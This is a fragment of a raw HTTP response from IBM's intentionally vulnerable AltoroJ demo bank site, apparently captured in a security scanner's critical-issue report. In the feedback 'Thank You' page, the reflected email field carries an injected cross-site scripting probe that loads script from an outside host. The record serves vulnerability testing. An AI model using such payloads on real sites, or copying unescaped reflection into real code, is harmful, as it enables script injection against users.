+            &lt;li&gt;&lt;a id="MenuHyperLink5" href="index.jsp?content=personal_investments.htm"&gt;Investments &amp;amp; Insurance&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink6" href="index.jsp?content=personal_other.htm"&gt;Other Services&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+
+        &lt;a id="CatLink2" class="subheader" href="index.jsp?content=business.htm"&gt;SMALL BUSINESS&lt;/a&gt;
+        &lt;ul class="sidebar"&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink7" href="index.jsp?content=business_deposit.htm"&gt;Deposit Products&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink8" href="index.jsp?content=business_lending.htm"&gt;Lending Services&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink9" href="index.jsp?content=business_cards.htm"&gt;Cards&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink10" href="index.jsp?content=business_insurance.htm"&gt;Insurance&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink11" href="index.jsp?content=business_retirement.htm"&gt;Retirement&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink12" href="index.jsp?content=business_other.htm"&gt;Other Services&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+
+        &lt;a id="CatLink3" class="subheader" href="index.jsp?content=inside.htm"&gt;INSIDE ALTORO MUTUAL&lt;/a&gt;
+        &lt;ul class="sidebar"&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink13" href="index.jsp?content=inside_about.htm"&gt;About Us&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink14" href="index.jsp?content=inside_contact.htm"&gt;Contact Us&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink15" href="cgi.exe"&gt;Locations&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink16" href="index.jsp?content=inside_investor.htm"&gt;Investor Relations&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink17" href="index.jsp?content=inside_press.htm"&gt;Press Room&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink18" href="index.jsp?content=inside_careers.htm"&gt;Careers&lt;/a&gt;&lt;/li&gt;
+			&lt;li&gt;&lt;a id="MenuHyperLink19" href="subscribe.jsp"&gt;Subscribe&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+    &lt;/td&gt;
+&lt;!-- TOC END --&gt;
+
+    &lt;td valign="top" colspan="3" class="bb"&gt;
+    
+    
+		
+		&lt;div class="fl" style="width: 99%;"&gt;
+		
+		 &lt;h1&gt;Thank You&lt;/h1&gt;
+		 
+		 &lt;p&gt;Thank you for your comments, Jason.  They will be reviewed by our Customer Service staff and given the full attention that they deserve. 
+		  
+			 Our reply will be sent to your email: john.doe@somewhere.com&lt;script src=//42267 id="
+		
+		&lt;/p&gt;
+		
+		&lt;/div&gt;
+    &lt;/td&gt;	
+&lt;/div&gt;
+
+ 
+
+&lt;!-- BEGIN FOOTER --&gt;
+
+
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;div id="footer" style="width: 99%;"&gt;
+    &lt;a id="HyperLink5" href="/altoromutual/index.jsp?content=privacy.htm"&gt;Privacy Policy&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;
+    &lt;a id="HyperLink6" href="/altoromutual/index.jsp?content=security.htm"&gt;Security Statement&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;
+    &lt;a id="HyperLink6" href="/altoromutual/status_check.jsp"&gt;Server Status Check&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp; 
+    &lt;a id="HyperLink6" href="/altoromutual/swagger/index.html"&gt;REST API&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp; 
+    &amp;copy;&amp;nbsp;2024 Altoro Mutual, Inc.
+    &lt;span style="color:red;font-weight:bold;font-style:italic;float:right"&gt;This web application is open source!&lt;span style="color:black;font-style:italic;font-weight:normal;float:right"&gt;&amp;nbsp;&lt;a href="https://github.com/AppSecDev/AltoroJ/"&gt;Get your copy from GitHub&lt;/a&gt; and take advantage of advanced features&lt;/span&gt;&lt;/span&gt;
+	&lt;br&gt;&lt;br&gt;&lt;br&gt;
+    &lt;div class="disclaimer"&gt;
+        The AltoroJ website is published by IBM Corporation for the sole purpose of
+        demonstrating the effectiveness of IBM products in detecting web application
+        vulnerabilities and website defects. This site is not a real banking site. Similarities,
+        if any, to third party products and/or websites are purely coincidental. This site is
+        provided "as is" without warranty of any kind, either express or implied. IBM does
+        not assume any risk in relation to your use of this website. For more information,
+        please go to &lt;a id="HyperLink7" href="http://www-142.ibm.com/software/products/us/en/subcategory/SWI10" &gt;http://www-142.ibm.com/software/products/us/en/subcategory/SWI10&lt;/a&gt;.&lt;br /&gt;&lt;br /&gt;
+
+        Copyright &amp;copy; 2008, 2024, IBM Corporation, All rights reserved.
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- END FOOTER --&gt;</RawResponse></Issue></CriticalIssues>
